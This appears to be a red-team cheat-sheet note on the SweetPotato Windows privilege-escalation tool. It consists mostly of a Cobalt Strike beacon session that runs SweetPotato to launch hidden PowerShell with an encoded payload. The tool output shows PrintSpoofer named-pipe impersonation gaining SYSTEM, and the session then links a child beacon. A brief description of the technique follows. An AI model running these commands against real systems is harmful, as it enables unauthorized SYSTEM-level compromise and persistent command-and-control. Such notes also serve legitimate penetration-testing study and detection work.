# SweetPotato

## [[Vulnerabilities/Printer Bug]] [[Kerberos/Printer Bug]] [[SQL Privilege Escalation]]
```beacon
beacon> execute-assembly C:\Tools\SweetPotato\bin\Debug\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAF[...snip...]ApAA=="

SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
[+] Attempting NP impersonation using method PrintSpoofer to launch C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[+] Triggering notification on evil PIPE \\sql01/pipe/7365ffd9-7808-4a0d-ab47-45850a41d7ed
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

beacon> connect localhost 4444
[*] Tasked to connect to localhost:4444
[+] host called home, sent: 20 bytes
[+] established link to child beacon: 10.10.18.221
```

```meta
requirements: 
results: 
oss: #linux 
source: https://github.com/CCob/SweetPotato
description: Force a SYSTEM service to authenticate to a rogue or man-in-the-middle service that the attacker creates. This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.
```